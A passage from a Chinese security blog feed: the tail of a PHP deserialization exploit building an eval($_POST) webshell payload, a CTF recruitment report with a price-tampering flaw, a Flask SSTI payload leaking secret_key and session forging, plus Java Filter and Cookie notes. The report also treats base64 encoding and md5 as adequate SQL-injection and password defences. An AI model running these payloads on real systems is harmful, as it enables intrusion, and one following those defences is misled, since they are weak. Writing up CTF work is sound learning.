class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$C1</span>=<span class="keyword">new</span> epic();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;aaa=<span class="keyword">array</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&#x27;eval($_POST[&quot;attack&quot;])&#x27;</span>,<span class="string">&quot;object&quot;</span>=&gt;<span class="keyword">array</span>(<span class="variable">$C1</span>,<span class="string">&quot;getAFKL&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chain</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$AFKL</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">epic</span> <span class="keyword">extends</span> <span class="title">chain</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;aaa=<span class="keyword">new</span> chain();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> pop();</span><br><span class="line"><span class="variable">$a</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a</span>[<span class="number">10</span>]=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;该正视过去的那段时光了，虽然并不顺利，但也要记录下来，成为博客文章的一员。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-朋友的学妹&quot;&gt;&lt;a href=&quot;#1-朋友的学妹&quot; class=&quot;headerlink&quot; title=&quot;1.朋友的学</summary>
      
    
    
    
    <category term="信息安全" scheme="https://xorex.space/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="极客大挑战" scheme="https://xorex.space/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>Syclover 二面报告</title>
    <link href="https://xorex.space/2021/04/11/221f4c81b7cd/"/>
    <id>https://xorex.space/2021/04/11/221f4c81b7cd/</id>
    <published>2021-04-11T15:00:38.000Z</published>
    <updated>2021-04-11T15:13:43.888Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>是该正视自己的过去了，关于自己在 Syclover 招新的第二次面试报告，也该让它作为自己博客文章的一员了。</p></blockquote><h2 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h2><h3 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01 搭建环境"></a>0x01 搭建环境</h3><p>首先抛出一个坑：在网站目录的配置文件里面添加的预加载文件选项是会报服务器内部错误，需要扔到 php.ini 文件里面。这是因为服务器使用的是 CGI 模式运行而不是 Apache 模式运行，在 CGI 模式下，php_value 无法被识别，会导致服务器500错误。</p><p>剩下的东西就按照文档里说的进行操作就能成功搭建网页了。</p><h3 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h3><h4 id="1-CSRF漏洞防御"><a href="#1-CSRF漏洞防御" class="headerlink" title="1. CSRF漏洞防御"></a>1. CSRF漏洞防御</h4><p>特意写了一个 xsrf.php 来对关键请求进行认证，来预防可能的 CSRF 攻击。防御手段是使用 uniqid() 生成时间串，然后将这个时间串 md5 加密之后作为 token 输出在 html 的一个隐藏表单里面，随着用户的点击一起通过 post 提交到后台，然后对这个 token 的值进行验证是否由服务器签发，如果不是，就终止程序，可以有效的防御 CSRF 攻击。</p><h4 id="2-SQL注入防御"><a href="#2-SQL注入防御" class="headerlink" title="2. SQL注入防御"></a>2. SQL注入防御</h4><p>对于所有和 SQL 数据库交互的命令，都保证拼接参数可控，把用户输入的 username 和 mail 经过 base64 编码处理，password 经过 md5 加密处理，之后再拼接成 SQL 语句执行，防止 SQL 注入。</p><h4 id="3-用户密码保护"><a href="#3-用户密码保护" class="headerlink" title="3. 用户密码保护"></a>3. 用户密码保护</h4><p>虽说这个不是防御漏洞，但是将用户的密码使用 md5 加密保存可以大大增加用户数据的隐私性，即使数据库被盗，用户的密码也不会被直接利用。</p><h4 id="4-文件包含漏洞防御"><a href="#4-文件包含漏洞防御" class="headerlink" title="4. 文件包含漏洞防御"></a>4. 文件包含漏洞防御</h4><p>直接禁用 php  phar zip 协议，然后使用自己定义的协议 master 来进行文件上传和搜索。仅限能够完成自己需要的用途。对于涉及到 include，file_put_contents，file_get_contents等，都进行了关键词过滤。比如 index.php 中的正则限制只能输入英文字母，几乎所有地方都用数据库或者程序生成的数据而不是用户输入。</p><h4 id="5-XSS漏洞防御"><a href="#5-XSS漏洞防御" class="headerlink" title="5. XSS漏洞防御"></a>5. XSS漏洞防御</h4><p>在展示由用户自主上传的信息：用户名和邮箱地址，的时候，使用 htmlspecialchars() 进行了 html 标志词过滤并限制长度，防止用户上传恶意的 XSS 代码，在一些界面输出时激活。</p><h4 id="6-无权限操作漏洞防御"><a href="#6-无权限操作漏洞防御" class="headerlink" title="6. 无权限操作漏洞防御"></a>6. 无权限操作漏洞防御</h4><p>在所有需要账号操作的页面都使用Session进行登录验证，只有登录成功才可以进行相应的操作。</p><h3 id="0x03-漏洞挖掘"><a href="#0x03-漏洞挖掘" class="headerlink" title="0x03 漏洞挖掘"></a>0x03 漏洞挖掘</h3><h3 id="1-反向加钱漏洞"><a href="#1-反向加钱漏洞" class="headerlink" title="1. 反向加钱漏洞"></a>1. 反向加钱漏洞</h3><p>在 info.php 中，使用了以下代码来购买商品：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;price&quot;</span> <span class="attr">value</span>=<span class="string">&quot;%price%&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$price</span> = intval(<span class="variable">$_POST</span>[<span class="string">&#x27;price&#x27;</span>]);</span><br><span class="line"><span class="variable">$point</span> -= <span class="variable">$price</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;update sshop.users set point=&quot;</span>.<span class="variable">$point</span>.<span class="string">&quot; where username=&#x27;&quot;</span>.base64_encode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为使用POST来提交价格，而且这个POST是用户可控的，那么就可以通过修改 price 的值实现 0元购或者反向加钱。</p><p>首先登录打开购买界面，然后启动 BurpSuite 拦截购买请求的包，将 POST 提交的数据 price 修改成负数：</p><p><img src="https://xorex.space/image/214.jpg" alt="image.png"></p><p>然后提交数据包，就可以看到自己的积分瞬间变多了。</p><p><img src="https://xorex.space/image/215.jpg" alt="image.png"></p><p>另外吐槽一下这个前端提高积分精度，直接拼接 ‘.0’ 可还行。</p><hr><p><strong>防御方法：</strong>在计算金钱的时候，用 <code>$_SESSION[&#39;goodid&#39;];</code>  保存的商品编号作为索引在数据库中查询价格，保证数据的可控性。</p><h4 id="2-敏感信息泄露"><a href="#2-敏感信息泄露" class="headerlink" title="2. 敏感信息泄露"></a>2. 敏感信息泄露</h4><p>存在文件 phpinfo.php 执行了 phpinfo() 代码，访问此页面会暴露 php 的各种信息，比如被禁用的些伪协议，php版本信息，预加载文件，文件路径，开启的选项，等。这些信息可以为黑客对网站渗透提供了便利，不利于网站的安全，建议删除。</p><h4 id="3-任意文件读取漏洞"><a href="#3-任意文件读取漏洞" class="headerlink" title="3. 任意文件读取漏洞"></a>3. 任意文件读取漏洞</h4><p>当然由于我实力过菜，还没完整的找出来如何实现任意文件的读取漏洞。</p><p>基本的想法还是有的，实现任意文件读取漏洞就必须要用到 index.php ，而访问这个页面的前提就是覆盖掉 .htaccess 文件。可以通过上传头像的页面，上传一个空的 .htaccess 文件，控制路径到根路径即可。但是不会绕过控制路径，所以没法实现。</p><p>查了各种资料，看了很多任意文件读取漏洞，搜了各种绕过姿势……还是没有结果</p><p>（我的搜索引擎利用能力还是太弱了）</p><p>说一下发现的一些细节吧：</p><ul><li><strong>config.php</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="variable">$path</span>.<span class="variable">$filename</span>,<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>这里的 $filename 可控，尝试利用文件名修改路径，但是无法成功。</p><ul><li><strong>shop.php</strong></li></ul><p>里面有一个 page 参数可以在 url 中控制，然后传进去 <code>&lt;?php echo $page+1;?&gt;</code>  但是传进去的是一个字符串，在和数字运算的时候会默认变成 0 ，所以暂时还不知道利用的方法。  </p><blockquote><p>任务一大概就这样了……</p></blockquote><h2 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h2><blockquote><p>任务一做的真的是太稀烂了，剩下最后两天做一下任务二来补救一下。</p></blockquote><p>首先搜了搜文章了解了一下 flask 框架的知识，大概知道了产生 SSTI 的原理，然后对着网站的接口试了一下，在 Your Name 这里尝试出来了存在 SSTI 漏洞，然后使用脚本验证关键词过滤。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL=<span class="string">&quot;http://106.54.75.217:1099/index&quot;</span></span><br><span class="line">Names=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    Names.append(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Name <span class="keyword">in</span> Names:</span><br><span class="line">    Data=&#123;<span class="string">&#x27;username&#x27;</span>:Name&#125;</span><br><span class="line">    Res=requests.post(url=URL,data=Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;banned&#x27;</span> <span class="keyword">in</span> Res.text:</span><br><span class="line">        print(Name,<span class="built_in">ord</span>(Name))</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>确定了单个字符 <code>+</code> <code>[</code> <code>\</code> <code>]</code> <code>&quot;</code> <code>#</code> <code>%</code> <code>&amp;</code> <code> </code> <code>^</code> <code>|</code> 都被过滤，然后使用脚本确定被过滤的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Names=<span class="built_in">dir</span>(Person)</span><br><span class="line">URL=<span class="string">&quot;http://106.54.75.217:1099/index&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Name <span class="keyword">in</span> Names:</span><br><span class="line">    Data=&#123;<span class="string">&#x27;username&#x27;</span>:Name&#125;</span><br><span class="line">    Res=requests.post(url=URL,data=Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;banned&#x27;</span> <span class="keyword">in</span> Res.text:</span><br><span class="line">        print(<span class="string">&quot;Banned:&quot;</span>,Name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Accpeded:&quot;</span>,Name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后可以确定地数据目前可以使用的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Accpeded: __le__</span><br><span class="line">Accpeded: __lt__</span><br><span class="line">Accpeded: __module__</span><br><span class="line">Accpeded: __ne__</span><br><span class="line">Accpeded: __new__</span><br><span class="line">Accpeded: __reduce__</span><br><span class="line">Accpeded: __reduce_ex__</span><br><span class="line">Accpeded: __repr__</span><br><span class="line">Accpeded: __delattr__</span><br><span class="line">Accpeded: __dir__</span><br><span class="line">Accpeded: __doc__</span><br><span class="line">Accpeded: __eq__</span><br><span class="line">Accpeded: __ge__</span><br><span class="line">Accpeded: __gt__</span><br><span class="line">Accpeded: __hash__</span><br><span class="line">Accpeded: __sizeof__</span><br><span class="line">Accpeded: __str__</span><br><span class="line">Accpeded: __weakref__</span><br></pre></td></tr></table></figure><p>以及被禁止的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Banned: __class__</span><br><span class="line">Banned: __dict__</span><br><span class="line">Banned: __format__</span><br><span class="line">Banned: __getattribute__</span><br><span class="line">Banned: __init__</span><br><span class="line">Banned: __init_subclass__</span><br><span class="line">Banned: __setattr__</span><br><span class="line">Banned: __subclasshook__</span><br></pre></td></tr></table></figure><p><del>然后就不知道怎么办</del></p><p>大概查了很多很多篇文章，在攻防世界照着 WriteUp 做了一道 SSTI 的题目之后，才（可能）弄明白做 SSTI 的思路，以及 SSTI 过程的语句含义。（啥都不知道真的是太痛苦了）</p><p>但是这个过滤了一堆东西，尤其是过滤 class 搞得刚刚接触 SSTI 的我不知所措，疯狂搜索可以代替 class 的方式，因为 <code>+</code> <code>[]</code> 也被过滤了，而且我对 SSTI 还是一知半解，所以也没有搜到什么有用的方法。</p><p>经过了各种漫无目的的乱试，抓包，发现了提示 <code>&lt;!--you are a guest--&gt;</code>  ，原来不收我的原因是因为我是 guest ，还给我传了一个 Cookie ，应该是用来验证登陆的，所以猜测可能需要用模板注入偷管理员 Cookie 出来，或者找到管理员的名字。（ 我还傻傻的去尝试了 admin/syclover/F4de/Longlone 去登录 ）</p><p>网上找了偷 Cookie 的语句 handler.settings 发现 set 被禁用了，一时不知道如何是好，只能漫无目的的查资料，在这里卡了很久很久。终于在一篇伪造 session 越权的文章里面知道了 secret_key 。然后找到了目标，开始各种搜索 secret_key 的文章，明白了 secret_key 的作用。想到了抓包的时候发现的 Cookie 中的 session ，大概明白了需要搞到的东西是 secret_key 。</p><p>然后在网上搜索 SSTI 获得 secret_key 的方法，然后找了一个不需要 class 的，然后搜了 globals 不需要中括号的访问方式，搞出来一个我都不知道行不行的 payload: <code>get_flashed_messages.__globals__.current_app.config</code>  粘到了 Your Name 框框里面，好家伙，直接成功了，拿到了 secret_key ： <code>&#39;E81SRrCaLmjVxJkzlugcGdWX&#39;</code></p><p>按照网上搜索，看到了 HCTF2018 admin 看样子好像一模一样。然后就是搜索用来解码的脚本，粘贴了一个运行之后 print 输出不回显，本地写了一个 print(“SYC”) 的脚本在 cmd 运行也没有输出。就去隔壁借用77的电脑跑脚本，这个时候他旁边的 fever_king 告诉我 python 有一个叫 flask-unsign 的模板，让我去试试。</p><p>pip 下完之后开始解密 Cookie ，有两个参数，一个是 username 一个是 uuid，果然是 guest 啊。改了 username 为 admin 之后再次访问页面，发现还是说我是 guest ，奇怪。</p><p>重新试了两次还是这样，就改了 uuid 为 1，再次上传，发现成功了，拿到了 Flag ：SYC{This_is_F1rst_f1ag_AND_You_are_re11y_g00d}</p><p>做这题真的是太折磨人了，尤其是漫无目的的搜索，哭.jpg</p><p>本来想做一下第二题的，但是时间肯定不够了，JUNCTION 已经躺平了一天半来做二面任务了，比赛最后一天也不帮忙不太好，就去给无名侠端茶倒水造数据了。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><ul><li><p>感谢浪爷中途的关心和鼓励，不然报告里就可能就没有任务二了。</p></li><li><p>三叶草的师傅们辛苦了，感谢你们对萌新们的付出！</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;是该正视自己的过去了，关于自己在 Syclover 招新的第二次面试报告，也该让它作为自己博客文章的一员了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;任务一&quot;&gt;&lt;a href=&quot;#任务一&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="信息安全" scheme="https://xorex.space/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="syclover" scheme="https://xorex.space/tags/syclover/"/>
    
  </entry>
  
  <entry>
    <title>Listener 和 Filter 学习笔记</title>
    <link href="https://xorex.space/2021/04/08/c99260ec0725/"/>
    <id>https://xorex.space/2021/04/08/c99260ec0725/</id>
    <published>2021-04-08T11:39:53.000Z</published>
    <updated>2021-04-08T14:01:55.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Listener-监听器"><a href="#Listener-监听器" class="headerlink" title="Listener 监听器"></a>Listener 监听器</h2><p>Listener 监听器是 Java EE 的三大组件之一。Java Web 的三大组件分别是 Servlet 程序，Filter 过滤器，Listener 监听器。Listener 是一个接口，只要实现这个接口，就获得了一个监听器</p><h3 id="ServletContextListener-监听-ServletContext"><a href="#ServletContextListener-监听-ServletContext" class="headerlink" title="ServletContextListener 监听 ServletContext"></a>ServletContextListener 监听 ServletContext</h3><p>首先编写一个类去实现 ServletContextListener 接口，编写监听到某个事件之后的需要执行的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Listener</span> <span class="keyword">implements</span> <span class="title">ServletContextListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextInitialized</span><span class="params">(ServletContextEvent sce)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ServletContext is initialized!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextDestroyed</span><span class="params">(ServletContextEvent sce)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ServletContext is destroyed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再 web.xml 中像配置 Servlet 一样去配置一个 Listener：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>space.xorex.BookStore.Listener.Listener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后当我们启动 Tomcat 成功之后，就可以捕捉到了 ServletContext 的初始化事件，然后交给 contextInitialized() 方法去处理。</p><h2 id="Filter-过滤器"><a href="#Filter-过滤器" class="headerlink" title="Filter 过滤器"></a>Filter 过滤器</h2><h3 id="Filter-概述"><a href="#Filter-概述" class="headerlink" title="Filter 概述"></a>Filter 概述</h3><p>对于非 Servlet 的资源请求，对非法请求进行拒绝只能依靠 Filter 来实现。Filter 过滤器的作用就是对请求进行过滤，所有请求在被处理之前，都会被交给 Filter。Filter 有权决定当前请求是否被继续传递下去（下一个 Filter 或者目标资源）。</p><h3 id="Filter-建立"><a href="#Filter-建立" class="headerlink" title="Filter 建立"></a>Filter 建立</h3><p>首先需要一个 Java 程序来对请求进行过滤处理，这里需要继承 Filter 接口，实现里面定义的几个方法，其中最重要的就是 doFilter() 方法，在访问目标资源之前会执行这个方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    HttpServletRequest req=(HttpServletRequest)servletRequest;</span><br><span class="line">    String userName=(String)(req.getSession().getAttribute(<span class="string">&quot;userName&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(userName==<span class="keyword">null</span>) &#123;</span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;/index.jsp&quot;</span>).forward(servletRequest, servletResponse); <span class="comment">//没有登录</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(userName.equals(<span class="string">&quot;Xorex&quot;</span>)) &#123;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse); <span class="comment">//确认权限足够</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;/index.jsp&quot;</span>).forward(servletRequest, servletResponse); <span class="comment">//权限不足</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后需要在 web.xml 文件中加入对 Filter 的一个映射，用来确定在访问那里的资源的时候使用此过滤器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ManagerFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>space.xorex.BookStore.filter.ManagerFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ManagerFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/pages/manager/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span> <span class="comment">&lt;!-- 这里 * 表示任意字符匹配 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后就可以过滤非管理员对 manager 下面资源的访问了。</p><h3 id="Filter-生命周期"><a href="#Filter-生命周期" class="headerlink" title="Filter 生命周期"></a>Filter 生命周期</h3><ol><li><p>首先执行 Filter 的构造方法。</p></li><li><p>然后执行 Filter 的 init() 方法。</p></li><li><p>遇到符合要求的过滤请求的时候，执行 doFilter() 方法。</p></li><li><p>服务器结束的时候执行 destroy() 方法。</p></li></ol><h3 id="Filter-运行过程"><a href="#Filter-运行过程" class="headerlink" title="Filter 运行过程"></a>Filter 运行过程</h3><p><img src="https://xorex.space/image/213.jpg"></p><p>仔细看过上面的图之后，需要注意的是在 chain.doFilter() 执行交给下一个过滤器或者目标资源之后，还会像递归一样回来的，这里可以对资源的响应进行二次确认。还需要注意 FilterChain 的构造方法，在 web.xml 中按照合理的顺序声明 Filter 程序即可。</p><h3 id="FilterConfig-类"><a href="#FilterConfig-类" class="headerlink" title="FilterConfig 类"></a>FilterConfig 类</h3><p>可以直接在 Filter 中使用方法 filterConfig 获取一个 FilterConfig 对象实例，然后用方法 getInitParameter() 来获取在 web.xml 中设置的 Filter 初始化参数 <code>&lt;init-param&gt;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Listener-监听器&quot;&gt;&lt;a href=&quot;#Listener-监听器&quot; class=&quot;headerlink&quot; title=&quot;Listener 监听器&quot;&gt;&lt;/a&gt;Listener 监听器&lt;/h2&gt;&lt;p&gt;Listener 监听器是 Java EE 的三大组件之一。</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="Filter" scheme="https://xorex.space/tags/Filter/"/>
    
    <category term="Listener" scheme="https://xorex.space/tags/Listener/"/>
    
  </entry>
  
  <entry>
    <title>Cookie &amp; Session</title>
    <link href="https://xorex.space/2021/04/07/fbc5026f0717/"/>
    <id>https://xorex.space/2021/04/07/fbc5026f0717/</id>
    <published>2021-04-07T09:39:32.000Z</published>
    <updated>2021-04-07T14:36:58.527Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="创建-Cookie"><a href="#创建-Cookie" class="headerlink" title="创建 Cookie"></a>创建 Cookie</h3><p>使用构造方法创建，输入键值对即可，可以同时创建多个 Cookie，然后都输入到响应头中让浏览器保存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie=<span class="keyword">new</span> Cookie(<span class="string">&quot;Tempest&quot;</span>, <span class="string">&quot;Yukino&quot;</span>);</span><br><span class="line">Cookie cookie1=<span class="keyword">new</span> Cookie(<span class="string">&quot;Yuuki&quot;</span>, <span class="string">&quot;Asuna&quot;</span>);</span><br><span class="line">resp.addCookie(cookie);</span><br><span class="line">resp.addCookie(cookie1);</span><br></pre></td></tr></table></figure><h3 id="Cookie-生命周期"><a href="#Cookie-生命周期" class="headerlink" title="Cookie 生命周期"></a>Cookie 生命周期</h3><p>Cookie 的生命周期由 <code>setMaxAge()</code> 来设置，有三种值：</p><ol><li><p>正整数 表示经过这个正整数秒之后，这个 Cookie 过期。</p></li><li><p>-1 表示 Cookie 生命周期为会话级别，关闭浏览器就删除（其实就没写进内存）</p></li><li><p>0 表示立刻删除 Cookie，立刻的意思是字面意思，浏览器接收到响应就删了。</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cookie[] cookies = req.getCookies();</span><br><span class="line"><span class="keyword">for</span>(Cookie i:cookies) &#123;</span><br><span class="line">    i.setMaxAge(<span class="number">3600</span>); <span class="comment">//一小时后删除</span></span><br><span class="line">    i.setMaxAge(-<span class="number">1</span>); <span class="comment">//关闭浏览器就删除</span></span><br><span class="line">    i.setMaxAge(<span class="number">0</span>) <span class="comment">//立刻删除</span></span><br><span class="line">    resp.addCookie(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改-删除-Cookie"><a href="#修改-删除-Cookie" class="headerlink" title="修改/删除 Cookie"></a>修改/删除 Cookie</h3><p>因为对于浏览器接收到一个 Cookie 之后，会先查看有没有 Name、Path 和 Domain 都一样的 Cookie，如果有，那么就去修改这个 Cookie 的 Value 属性为新接收到的 Cookie 的 Value 值。如果没有，则创建一个新的 Cookie 去保存里面的内容。</p><p>所以对一个 Cookie 进行修改或删除的时候，尽量先获取这个 Cookie，然后设置 Value 或者修改其 age 为 